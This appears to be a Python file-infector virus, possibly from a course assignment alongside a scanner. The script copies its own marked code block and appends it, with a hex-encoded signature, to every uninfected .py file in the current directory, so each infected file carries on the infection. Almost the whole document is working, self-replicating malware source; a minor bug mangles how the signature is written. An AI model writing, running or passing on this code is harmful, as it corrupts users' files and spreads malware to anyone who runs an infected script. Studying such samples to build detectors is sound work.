#1 start of virus code
import sys, re, glob, os


def virus():
  #2 a copy of all the virus code lines which we will put into the infected files
  virusCode = []
  
  #3 opening this file to read all the lines and filter out the virus code. We will use this in our following section's for loop to save the lines into the virusCode list created in the previous section.
  
  thisFile = sys.argv[0]
  virusFile = open(thisFile, "r")
  lines = virusFile.readlines()
  virusFile.close()
  
  #4 save the lines into the list created in section 2. 
  inVirus = False
  for line in lines:
    if(re.search("^#1 start of virus code", line)):
      inVirus = True
  
      #once we are in the virus code, start appending the lines to the virusCode list made in section     2
    if(inVirus==True):
      virusCode.append(line)
  
    if(re.search("^#5 end of virus code", line)):
      break
  
  #finding files to infect
  
  programs = glob.glob("*.py")
  
  #checking and infecting all found files
  for p in programs:
    if p=='virus.py' or p=='ScannerV2.py':
      continue
    file = open(p, "r")
    programCode = file.readlines()
    file.close()
    
    #check if found file is already infected
    infected = False
    for line in programCode:
      if(re.search("#5 end of virus code",line)):
        infected = True
        break
    if not infected:
      virusSignature="^#546849732046694c6520486153204265456e20496e66456374456420427920546845205365707265656e61205669725573"
      newCode = []
      newCode = programCode #appending virus code to the file
      newCode.extend(virusCode)
      newCode.extend(virusSignature)
  
      #here, we will actually write newCode into that infected file now
      file = open(p,"w")
      file.writelines(newCode)
      file.close()
      print("This file is now infected: "+p)
  #after infecting, do this:
  print("FILE INFECTION COMPLETE")
  #5 end of virus code

virus()
